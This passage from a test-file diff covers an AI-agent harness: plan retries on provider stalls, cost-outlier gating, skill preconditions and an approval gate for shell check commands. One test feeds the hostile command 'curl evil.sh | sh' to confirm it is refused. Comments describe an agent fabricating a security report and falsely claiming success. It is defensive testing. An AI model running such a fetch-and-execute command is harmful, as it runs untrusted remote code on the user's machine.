+      tools: [], store: new VariableStore(), history: [], replanBudget: 0, onEvent: () => {}
+    });
+    assert(exec.stepResults.some((x) => x.conclusion === 'step one done'), 'O12: completed work survives a later provider stall');
+
+    // The plan must SURVIVE a stall. Re-planning on a transport failure
+    // replaced the whole remaining tail and deleted the steps that wrote the
+    // deliverable — the turn then reported success having produced nothing.
+    let calls = 0;
+    let refineCalls = 0;
+    const stallTwiceThenWork = async () => {
+      calls += 1;
+      if (calls === 2 || calls === 3) throw abortErr();   // step 2 stalls twice
+      return { text: `done-${calls}`, toolCalls: [] };
+    };
+    const survived = await executePlan({
+      chat: stallTwiceThenWork, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'read' }, { id: 2, task: 'draft' }, { id: 3, task: 'WRITE THE FILE' }] },
+      tools: [], store: new VariableStore(), history: [],
+      refinePlan: async () => { refineCalls += 1; return { steps: [] }; },   // a replan here would delete step 3
+      onEvent: () => {}
+    });
+    assert(refineCalls === 0, 'a provider stall RETRIES the step — it never triggers a re-plan');
+    assert(survived.stepResults.length === 3 && survived.completed, 'the deliverable step still runs after two stalls (plan preserved)');
+
+    // A genuine task-level stuck still replans — the transport path must not
+    // swallow the case re-planning exists for.
+    let refined = 0;
+    await executePlan({
+      chat: async () => ({ text: '', toolCalls: [{ id: 't', name: 'noop', args: {} }] }),   // never finishes → budget stuck
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: new VariableStore(),
+      history: [], stepBudget: 1, refinePlan: async () => { refined += 1; return { steps: [] }; }, onEvent: () => {}
+    });
+    assert(refined === 1, 'a real task-level stuck still re-plans as before');
+
+    // Plan attrition: a re-plan that drops the remaining steps must be VISIBLE.
+    // Run 6 completed a 4-step plan having run 2, wrote nothing, and reported
+    // success — the harness itself never noticed.
+    const shrankEvents = [];
+    let n2 = 0;
+    const shrank = await executePlan({
+      chat: async () => { n2 += 1; return n2 === 1 ? { text: '', toolCalls: [{ id: 'x', name: 'noop', args: {} }] } : { text: 'ok', toolCalls: [] }; },
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }, { id: 3, task: 'WRITE FILE' }] },
+      tools: [], store: new VariableStore(), history: [], stepBudget: 1,
+      refinePlan: async () => ({ steps: [] }),           // drops steps 2 and 3
+      onEvent: (e) => { if (e.kind === 'plan-shrank') shrankEvents.push(e); }
+    });
+    assert(shrankEvents.length === 1 && shrankEvents[0].skipped.includes(3), 'a plan that loses its steps to a re-plan reports plan-shrank');
+    assert(Array.isArray(shrank.skipped) && shrank.skipped.includes(3), 'the skipped step ids are returned so the reply can say what did not run');
+
+    const clean = await executePlan({
+      chat: async () => ({ text: 'done', toolCalls: [] }), callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }] },
+      tools: [], store: new VariableStore(), history: [], onEvent: () => {}
+    });
+    assert(clean.skipped.length === 0, 'a plan that runs every step reports no attrition');
+  }
+
+  // Cost-outlier gating. This signal never fired in ANY live drive, because
+  // each run created a fresh project and medianOf returns 0 below
+  // MIN_COST_HISTORY. That is correct (a new project must not cry wolf) but it
+  // was entirely uncovered — the quiet path and the loud path both untested.
+  {
+    const { medianOf, COST_OUTLIER_FACTOR, MIN_COST_HISTORY } = require('../src/main/ipc');
+    assert(medianOf([100, 200, 300, 400]) === 0, 'cost: fewer than MIN_COST_HISTORY samples yields no median — a new project stays silent');
+    assert(medianOf([100, 200, 300, 400, 500]) === 300, 'cost: an odd sample count takes the middle value');
+    assert(medianOf([100, 200, 300, 400, 500, 600]) === 350, 'cost: an even sample count averages the two middles');
+    assert(medianOf([0, -5, null, 100, 200, 300, 400, 500]) === 300, 'cost: zero/negative/null samples are discarded before the median');
+    assert(medianOf([]) === 0 && medianOf([1, 2]) === 0, 'cost: empty and tiny histories are silent, never NaN');
+
+    // The threshold itself: 3x the median fires, at-or-below does not.
+    const median = medianOf([100, 100, 100, 100, 100]);
+    assert(median === 100, 'cost: median of a flat history is that value');
+    assert(!(300 > median * COST_OUTLIER_FACTOR), 'cost: exactly 3x is NOT an outlier (strictly greater)');
+    assert(301 > median * COST_OUTLIER_FACTOR, 'cost: above 3x IS an outlier');
+    assert(MIN_COST_HISTORY >= 5, 'cost: the quiet window is at least five turns');
+  }
+
+  // TRANSPORT RETRY — exhaustive. This path has never fired against a live
+  // provider (3 of 11 drives stalled, none during a verified run), so it
+  // cannot lean on production evidence. Every branch is pinned here instead:
+  // detection breadth, retry budget, per-step reset, exhaustion fall-through,
+  // the skipped wrap-up call, and the STOP interaction.
+  {
+    const { executeStep, executePlan, isProviderAbort, TRANSPORT_RETRIES } = require('../src/main/execute');
+    const abortErr = () => { const e = new Error('This operation was aborted'); e.name = 'AbortError'; return e; };
+    const store = () => new VariableStore();
+
+    // --- detection: what counts as a provider abort, and what must NOT ---
+    assert(isProviderAbort(abortErr()), 'transport: an AbortError is a provider abort');
+    // CONTRACT CHANGED: prose is no longer consulted at all. A bare message
+    // with no name and no code is NOT a stall — the connector sets a code at
+    // the point the cause is known, so anything reaching here without one is
+    // an unknown failure and must surface, not be silently retried.
+    assert(!isProviderAbort({ message: 'This operation was aborted' }), 'transport: a bare message with no code is NOT classified — prose is not evidence');
+    assert(!isProviderAbort(new Error('ENOENT: no such file')), 'transport: an ordinary error is NOT a provider abort');
+    assert(!isProviderAbort(null) && !isProviderAbort(undefined), 'transport: null/undefined never crash the classifier');
+    assert(!isProviderAbort(new Error('the user aborted-ish thing')), 'transport: prose is never consulted — a message containing "aborted" is not a stall');
+
+    // Structured codes, set where the cause is known, read by exact match.
+    const { CODES, providerError } = require('../src/main/providers/errors');
+    assert(isProviderAbort(providerError(CODES.PROVIDER_TIMEOUT, 'Request timed out after 300s')), 'transport: PROVIDER_TIMEOUT is a stall');
+    assert(isProviderAbort(providerError(CODES.STREAM_STALLED, 'stream stalled (no data)')), 'transport: STREAM_STALLED is a stall');
+    assert(!isProviderAbort(providerError(CODES.USER_ABORT, 'stopped by user')), 'transport: USER_ABORT is the user stopping, NOT a stall to retry');
+    assert(!isProviderAbort(providerError('SOMETHING_ELSE', 'This operation was aborted')), 'transport: a non-timeout code wins over any wording in the message');
+
+    // --- a non-abort error must still propagate, not be swallowed as a stall ---
+    let threw = null;
+    try {
+      await executeStep({ chat: async () => { throw new Error('boom'); }, callTool: async () => ({ text: 'ok' }),
+        model: 'm', step: { id: 1, task: 't' }, tools: [], history: [], store: store(), onEvent: () => {} });
+    } catch (e) { threw = e; }
+    assert(threw && threw.message === 'boom', 'transport: a genuine error still throws — only aborts degrade');
+
+    // --- the wrap-up model call is SKIPPED on a stall (a dead provider cannot summarize) ---
+    let chatCalls = 0;
+    const r1 = await executeStep({
+      chat: async () => { chatCalls += 1; throw abortErr(); }, callTool: async () => ({ text: 'ok' }),
+      model: 'm', step: { id: 1, task: 't' }, tools: [], history: [], store: store(), onEvent: () => {}
+    });
+    assert(chatCalls === 1 && r1.partial === '', 'transport: no wrap-up call after a stall — the provider that just timed out is not asked to summarize');
+
+    // --- retry budget: exactly TRANSPORT_RETRIES, then it becomes a real stuck ---
+    let attempts = 0; let replanned = 0; const events = [];
+    await executePlan({
+      chat: async () => { attempts += 1; throw abortErr(); },   // stalls forever
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: store(), history: [],
+      refinePlan: async () => { replanned += 1; return { steps: [] }; },
+      onEvent: (e) => { if (e.kind === 'transport-retry') events.push(e); }
+    });
+    assert(events.length === TRANSPORT_RETRIES, `transport: exactly ${TRANSPORT_RETRIES} retries are emitted, not more`);
+    assert(events[0].attempt === 1 && events[events.length - 1].attempt === TRANSPORT_RETRIES, 'transport: retry events carry an increasing attempt number');
+    assert(attempts === TRANSPORT_RETRIES + 1, 'transport: the step is attempted once plus its retries');
+    assert(replanned === 1, 'transport: once retries are exhausted it falls through to the normal re-plan path');
+
+    // --- per-step reset: a later step gets its OWN retry budget ---
+    // Keyed off the STEP, not the call index: a retry shifts every later index,
+    // so an index-based fixture silently tests something else (it did).
+    const stalled = {}; const perStep = [];
+    const twoStalls = async ({ messages }) => {
+      const last = String((messages[messages.length - 1] || {}).content || '');
+      const id = (last.match(/CURRENT STEP \((\d+)\)/) || [])[1];
+      if ((id === '2' || id === '3') && !stalled[id]) { stalled[id] = true; throw abortErr(); }
+      return { text: `ok-${id || '?'}`, toolCalls: [] };
+    };
+    const spread = await executePlan({
+      chat: twoStalls, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }, { id: 3, task: 'c' }] },
+      tools: [], store: store(), history: [],
+      refinePlan: async () => { throw new Error('must not re-plan'); },
+      onEvent: (e) => { if (e.kind === 'transport-retry') perStep.push(e.step); }
+    });
+    assert(perStep.length === 2 && spread.completed, 'transport: a stall in a later step gets its own budget — the counter resets per step');
+    assert(spread.stepResults.length === 3, 'transport: all three steps still complete across two separate stalls');
+
+    // --- user STOP during a stall wins over the retry path ---
+    let stopped = false;
+    const stopping = await executePlan({
+      chat: async () => { stopped = true; throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }] }, tools: [], store: store(), history: [],
+      isAborted: () => stopped, refinePlan: async () => ({ steps: [] }), onEvent: () => {}
+    });
+    assert(stopping.aborted === true, 'transport: a user STOP mid-stall aborts the turn rather than retrying');
+  }
+
+  // PRECONDITION GATE: a skill whose declared tools are ALL unreachable cannot
+  // do its job. Measured 2026-08-14 — a dead Fluency connector (401, zero of
+  // nine tools resolving) still produced a formatted, filed, versioned monthly
+  // security report that was invented end to end, down to named individuals.
+  {
+    const { skillPreconditions } = require('../src/main/skill-content');
+    const skill = (fns) => ({ name: 's', definition: `---\nname: s\nmcp_functions:\n${fns.map((f) => `  - ${f}`).join('\n')}\n---\nbody` });
+    const connected = ['Fluency_Expo__list_cases', 'Fluency_Expo__summarize_case_metrics', 'other__ping'];
+
+    const dead = skillPreconditions(skill(['list_cases', 'summarize_case_metrics']), []);
+    assert(dead.unmet === true && dead.missing.length === 2, 'precondition: a skill with NO tools reachable is unmet');
+
+    const live = skillPreconditions(skill(['list_cases', 'summarize_case_metrics']), connected);
+    assert(live.unmet === false && live.resolved.length === 2, 'precondition: namespaced tools resolve by suffix match');
+
+    const partial = skillPreconditions(skill(['list_cases', 'gone_tool']), connected);
+    assert(partial.unmet === false && partial.missing[0] === 'gone_tool',
+      'precondition: PARTIAL resolution is a degraded run, not a refusal — only zero is the cliff');
+
+    const noDecl = skillPreconditions(skill([]), []);
+    assert(noDecl.unmet === false, 'precondition: a skill declaring no tools is never unmet (local-only skills still run)');
+    assert(skillPreconditions(null, connected).unmet === false, 'precondition: a missing skill row never throws');
+    assert(skillPreconditions({ name: 'x', definition: 'no frontmatter here' }, []).unmet === false,
+      'precondition: a skill without frontmatter declares nothing and is not blocked');
+  }
+
+  // O27: the debt ledger — findings persist; a repeat is a promotion signal.
+  {
+    const p = repo.projects.create({ name: 'Debt Ledger' });
+    const dbase = path.join(tmp, 'debt-base'); fs.mkdirSync(dbase, { recursive: true });
+    projectDocs.ensureCanonicalDocs({ projectId: p.id, docsBase: dbase });
+    assert(fs.existsSync(path.join(dbase, 'docs', 'DEBT.md')), 'O27: DEBT joins the canonical doc set on bootstrap');
+
+    const f = { lens: 'quality', severity: 'high', file: 'src/a.js', issue: 'duplicated parser logic', fix: 'extract shared helper', status: 'fix attempted — unverified' };
+    const d1 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [f] });
+    assert(d1.added === 1 && d1.repeats === 0, 'O27: a first finding lands with no repeat flag');
+    const d2 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [f] });
+    const ledger = fs.readFileSync(path.join(dbase, 'docs', 'DEBT.md'), 'utf8');
+    assert(d2.repeats === 1 && ledger.includes('REPEAT ×2 — PROMOTE TO GATE'), 'O27: the SECOND occurrence is flagged promote-to-gate');
+    assert(ledger.includes('duplicated parser logic') && ledger.includes('fix attempted — unverified'), 'O27: findings carry status + fix into the ledger');
+    assert(projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [] }).added === 0, 'O27: nothing to record writes nothing');
+
+    // Review fix 6: the key rides an HTML comment — an issue containing `-->`
+    // must not end the marker early and break repeat detection.
+    const nasty = { lens: 'quality', severity: 'med', file: 'src/x.js', issue: 'comment --> breaks <parsing>', fix: 'escape it' };
+    projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [nasty] });
+    const r2 = projectDocs.appendDebt({ projectId: p.id, docsBase: dbase, findings: [nasty] });
+    const led2 = fs.readFileSync(path.join(dbase, 'docs', 'DEBT.md'), 'utf8');
+    assert(r2.repeats === 1, 'O27: repeat detection survives an issue containing comment-closing text');
+    assert(!/key:[^>\n]*-->[^\n]*-->/.test(led2), 'O27: the key marker is sanitized — no premature comment close');
+    repo.projects.archive(p.id);
+  }
+
+  // O8 regression: a durable decision is a DIRECTION, not a task parameter.
+  // Found by driving a real turn — `output_path = docs/HARNESS_FLOWCHART.md`
+  // was promoted to a permanent user-confidence value and written to the SPEC.
+  {
+    const { normalizeRecords, DURABLE_KEYS } = require('../src/main/plan-derive');
+    const keep = normalizeRecords([
+      { key: 'platform', value: 'react-native' },
+      { key: 'document_format', value: 'monthly-report.html' }
+    ]);
+    assert(keep.length === 2, 'O8: real direction decisions are kept');
+
+    // Every key below was proposed by a live planner, not invented: the first
+    // two polluted a SPEC on run 1; the last three came from the A/B run that
+    // restored the permissive wording. Note they differ between runs — the
+    // junk vocabulary is open-ended, which is exactly why this is an allowlist
+    // and not a denylist.
+    const junk = normalizeRecords([
+      { key: 'output_path', value: 'docs/HARNESS_FLOWCHART.md' },
+      { key: 'output_format', value: 'markdown_with_single_mermaid_block' },
+      { key: 'output_target', value: 'docs/HARNESS_FLOWCHART.md' },
+      { key: 'format', value: 'mermaid' },
+      { key: 'scope', value: 'one coding turn' },
+      { key: 'project_title', value: 'Harness Diagram' },
+      { key: 'node_count', value: '24' }
+    ]);
+    assert(junk.length === 0, 'O8: task parameters are NOT durable decisions (all keys observed from live planners)');
+    assert(!DURABLE_KEYS.has('output_path') && DURABLE_KEYS.has('platform'), 'O8: the vocabulary is an allowlist, not a shape check');
+    assert(normalizeRecords([{ key: 'PLATFORM ', value: ' swift ' }])[0].key === 'platform', 'O8: keys/values still normalize before validation');
+    assert(normalizeRecords([{ key: 'platform', value: 'x'.repeat(200) }]).length === 0, 'O8: overlong values still rejected');
+
+    // O14: the guard must SAY what it discarded — a silent guard cannot be
+    // told apart from a planner that proposed nothing.
+    const { partitionRecords } = require('../src/main/plan-derive');
+    const part = partitionRecords([{ key: 'platform', value: 'swift' }, { key: 'output_path', value: 'docs/X.md' }]);
+    assert(part.records.length === 1 && part.dropped.length === 1 && part.dropped[0] === 'output_path',
+      'O8/O14: dropped record keys are reported, not swallowed');
+    assert(partitionRecords([]).dropped.length === 0, 'O8/O14: nothing proposed reports nothing dropped');
+
+    // The emit in ipc.js reads plan.droppedRecords, so EVERY return path of
+    // derivePlan must carry it — align, simple, and planned alike. A path that
+    // forgot it would silently disable the instrument on those turns.
+    const junkRec = [{ key: 'platform', value: 'swift' }, { key: 'output_path', value: 'docs/X.md' }];
+    const planWith = (args) => ({ chat: async () => ({ toolCalls: [{ id: 'p', name: 'submit_plan', args }] }) });
+    const shapes = {
+      align: await derivePlan({ connector: planWith({ simple: true, goal: 'g', record: junkRec, decisions: [{ question: 'Which platform?' }] }), model: 'm', userText: 'u', codingMode: true, tools: [], store: new VariableStore(), loadedSkills: [], agents: [] }),
+      simple: await derivePlan({ connector: planWith({ simple: true, goal: 'g', record: junkRec }), model: 'm', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] }),
+      planned: await derivePlan({ connector: planWith({ simple: false, goal: 'g', record: junkRec, steps: [{ task: 'a' }, { task: 'b' }] }), model: 'm', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] })
+    };
+    for (const [name, p] of Object.entries(shapes)) {
+      assert(Array.isArray(p.droppedRecords) && p.droppedRecords[0] === 'output_path' && p.record.length === 1,
+        `O8/O14: the ${name} return path carries droppedRecords for the instrument`);
+    }
+
+    // O8 tiering: `user` means the HUMAN said it. A wrong inference stored at
+    // `user` was permanent — the tier is overwrite-protected — so only an
+    // align ratification earns it; a plan-inferred record stays correctable.
+    const tier = (ratified) => (ratified ? { confidence: 'user', source: 'align' } : { confidence: 'derived', source: 'plan-record' });
+    const inferred = new VariableStore();
+    const inferredEntry = inferred.set({ key: 'framework', value: 'react' }, tier(false));
+    assert(inferredEntry.confidence === 'derived', 'O8: a planner-inferred direction is derived, not user');
+    inferred.set({ key: 'framework', value: 'vue' }, { confidence: 'derived', source: 'observed' });
+    assert(inferred.get('framework') === 'vue', 'O8: a wrong inference REMAINS CORRECTABLE by later evidence');
+
+    const ratifiedStore = new VariableStore();
+    ratifiedStore.set({ key: 'framework', value: 'react' }, tier(true));
+    ratifiedStore.set({ key: 'framework', value: 'vue' }, { confidence: 'derived', source: 'observed' });
+    assert(ratifiedStore.get('framework') === 'react', 'O8: an align-ratified answer still outranks later model guesses');
+  }
+
+  // O30 diagram blind spot: the rot that motivated the drift pass (a stale
+  // mermaid flowchart) was invisible to it — diagrams are now in the scan set.
+  {
+    const { docDiagrams } = require('../src/main/drift');
+    const dd = path.join(tmp, 'diagdocs'); fs.mkdirSync(dd, { recursive: true });
+    fs.writeFileSync(path.join(dd, 'PSEUDOCODE.md'), 'intro\n\n```mermaid\nflowchart TD\n  A --> B\n```\n\ntail\n');
+    fs.writeFileSync(path.join(dd, 'DESIGN.md'), 'no diagrams here\n');
+    const found = docDiagrams(dd);
+    assert(found.length === 1 && found[0].path === 'PSEUDOCODE.md', 'O30: fenced diagrams are extracted from canonical docs');
+    assert(found[0].content.includes('flowchart TD') && !found[0].content.includes('intro'), 'O30: only the diagram block is scanned, not the surrounding prose');
+    assert(docDiagrams(path.join(tmp, 'nope')).length === 0, 'O30: a missing docs dir yields nothing, never throws');
+  }
+
+  // O28: test integrity is stated where plans are shaped.
+  {
+    const { DERIVE_PROMPT } = require('../src/main/plan-derive');
+    const prompt = DERIVE_PROMPT('(ctx)', 'fix the tests', true, false);
+    assert(prompt.includes('TEST INTEGRITY') && prompt.includes('NEVER deleted, skipped, or weakened'), 'O28: CODING_RULES carries the test-integrity rule');
+    assert(!DERIVE_PROMPT('(ctx)', 'x', false, false).includes('TEST INTEGRITY'), 'O28: the rule rides coding mode only');
+  }
+
+  // O29: the repo speaks first — rulebook discovery + planner injection.
+  {
+    const wd = path.join(tmp, 'rulebook'); fs.mkdirSync(path.join(wd, 'docs'), { recursive: true });
+    assert(projectDocs.readRulebook(wd) === null, 'O29: no rulebook is a valid, silent passthrough');
+    fs.writeFileSync(path.join(wd, 'CLAUDE.md'), '# generic rules');
+    fs.writeFileSync(path.join(wd, 'docs', 'AGENT_RULES.md'), '# project rules\n- 15 lines max');
+    assert(projectDocs.readRulebook(wd).relPath === path.join('docs', 'AGENT_RULES.md'), 'O29: the project rulebook outranks generic agent files');
+    fs.writeFileSync(path.join(wd, 'AGENT_RULES.md'), '# root rules');
+    assert(projectDocs.readRulebook(wd).relPath === 'AGENT_RULES.md', 'O29: root AGENT_RULES.md is first-found');
+
+    const ctx = planContext({ rulebook: '- functions stay under 15 statements' });
+    assert(ctx.includes('PROJECT RULEBOOK') && ctx.includes('15 statements'), 'O29: the rulebook rides Pass 2 under its banner');
+    assert(!planContext({}).includes('PROJECT RULEBOOK'), 'O29: no rulebook, no banner — zero cost');
+  }
+
+  // O30: the drift pass — read-only scan, validated findings, doc staleness.
+  {
+    const { driftScan, recentSourceFiles } = require('../src/main/drift');
+    const wd = path.join(tmp, 'drift'); fs.mkdirSync(path.join(wd, 'src'), { recursive: true });
+    fs.writeFileSync(path.join(wd, 'src', 'a.js'), 'function big(){ /* 40 lines of everything */ }');
+    fs.writeFileSync(path.join(wd, 'src', 'b.js'), 'function ok(){}');
+    fs.writeFileSync(path.join(wd, 'readme.txt'), 'not code');
+
+    const picked = recentSourceFiles(`src${path.sep}\nsrc${path.sep}a.js\nsrc${path.sep}b.js\nreadme.txt`, wd);
+    assert(picked.length === 2 && picked.every((f) => f.endsWith('.js')), 'O30: only source files are scanned, dirs and prose skipped');
+
+    const ct = buildCodingTools({ root: wd, approveAction: async () => false, projectId: 'drift-smoke' });
+    const fakeConnector = { chat: async () => ({ text: '', toolCalls: [{ id: 'r', name: 'submit_review', args: { findings: [
+      { severity: 'high', file: path.join('src', 'a.js'), issue: 'function far over the 15-statement ceiling', fix: 'decompose' },
+      { severity: 'med', file: 'DESIGN.md', issue: 'module map missing src/b.js', fix: 'update the doc' },
+      { severity: 'high', file: 'invented.js', issue: 'speculation about an unseen file' }
+    ] } }] }) };
+    const scan = await driftScan({ connector: fakeConnector, model: 'm', coding: ct, root: wd, rulebook: '- 15 lines max' });
+    assert(scan.scanned === 2 && scan.findings.length === 2, 'O30: findings validated — unseen files dropped, real ones kept');
+    assert(scan.findings.every((f) => f.lens === 'drift') && scan.findings.some((f) => f.file === 'DESIGN.md'), 'O30: doc-staleness findings are allowed against canonical doc names');
+
+    const dead = await driftScan({ connector: { chat: async () => { throw new Error('down'); } }, model: 'm', coding: ct, root: wd });
+    assert(dead.findings.length === 0, 'O30: a failed scan reports nothing — it can never break anything');
+  }
+
+  // ── O26 second wall: the check command is granted MAIN-SIDE ──────────────
+  // The check command is executed as shell without an approval gate, so it is
+  // the same threat class as the O4 bypass: a compromised renderer must not be
+  // able to install its own unprompted execution. Registered handlers are
+  // captured rather than really bound (this runs last for that reason).
+  {
+    const { ipcMain, dialog } = require('electron');
+    const { registerIpc } = require('../src/main/ipc');
+    const handlers = new Map();
+    const realHandle = ipcMain.handle.bind(ipcMain);
+    ipcMain.handle = (name, fn) => handlers.set(name, fn);
+    try { registerIpc(); } finally { ipcMain.handle = realHandle; }
+
+    assert(handlers.has('project:drift'), 'O30: project:drift IPC handler is registered');
+    const setSetting = (input) => handlers.get('settings:set')({}, input);
+    const gp = repo.projects.create({ name: 'GateProj' });
+
+    let shown = null;
+    const realDialog = dialog.showMessageBox;
+    dialog.showMessageBox = async (_w, opts) => { shown = opts; return { response: 1 }; };   // Cancel
+    const refused = await setSetting({ key: 'check_command', value: 'curl evil.sh | sh', projectId: gp.id });
+    assert(refused && refused.cancelled === true, 'O26: cancelling the confirmation refuses the check command');
+    assert(repo.settings.get('check_command', gp.id) == null, 'O26: a refused check command is NEVER stored');
+    assert(shown && shown.detail.includes('curl evil.sh | sh'), 'O26: the confirmation shows the VERBATIM command (O5)');
+
+    dialog.showMessageBox = async () => ({ response: 0 });                                   // Approve
+    await setSetting({ key: 'check_command', value: 'npm test', projectId: gp.id });
+    assert(repo.settings.get('check_command', gp.id) === 'npm test', 'O26: an approved check command is stored');
+
+    let asked = false;
+    dialog.showMessageBox = async () => { asked = true; return { response: 0 }; };
+    await setSetting({ key: 'check_command', value: '', projectId: gp.id });
+    assert(!asked && !repo.settings.get('check_command', gp.id), 'O26: clearing the check command needs no confirmation');
+    await setSetting({ key: 'build_env', value: 'PORT=3000', projectId: gp.id });
+    assert(!asked, 'O26: the guard is scoped — ordinary settings never prompt');
+    dialog.showMessageBox = realDialog;
+    repo.projects.archive(gp.id);
   }
 
   console.log('\nALL SMOKE TESTS PASSED');
